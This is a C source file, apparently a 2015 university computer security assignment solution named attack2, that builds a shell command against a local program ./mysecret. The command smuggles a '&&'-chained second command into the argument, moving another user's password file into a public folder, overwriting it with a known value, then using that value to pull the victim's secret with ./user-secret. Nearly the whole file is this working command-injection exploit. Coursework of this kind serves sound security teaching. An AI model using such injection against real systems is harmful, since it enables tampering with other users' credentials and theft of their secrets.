// CE/CZ4062 Computer Security Assignment Solution 2
// By Jiang Huan, Li Yichang & Li Yueran, NTU SCE
// Created on 24 Oct, 2015

#include <stdio.h>
#include <string.h>

void sanitize(char user[], char * arg)
{
  int i;
  int pos=0;
  for(i=0; i<15 && arg != NULL && *arg != '\0'; ++i)
  {
    if(*arg >= 'a' && *arg <= 'z')
      user[pos++] = *arg;
    ++arg;
  }
  user[pos] = '\0';
}

int main(int argc, char* argv[])
{
  if(argc < 2)
  {
    printf("attack2 Usage: ./attack2 {username}\n");
    return 0;
  }
  char user[15], cmd[512], fake[15] = "abcdefggfedcba";
  sanitize(user, argv[1]);
  strcpy(cmd, "cd /home/alice/Public && ./mysecret ");
  strcat(cmd, "'&& cd /home/alice/Private && mv -f password-");
  strcat(cmd, user);
  strcat(cmd, " /home/alice/Public && echo ");
  strcat(cmd, fake);
  strcat(cmd, " > password-");
  strcat(cmd, user);
  strcat(cmd, " cd /home/alice/Public ' > /dev/null && ./user-secret ");
  strcat(cmd, user);
  strcat(cmd, " ");
  strcat(cmd, fake);
  strcat(cmd, " | grep '^Secret:'");
  system(cmd);
  return 0;
}
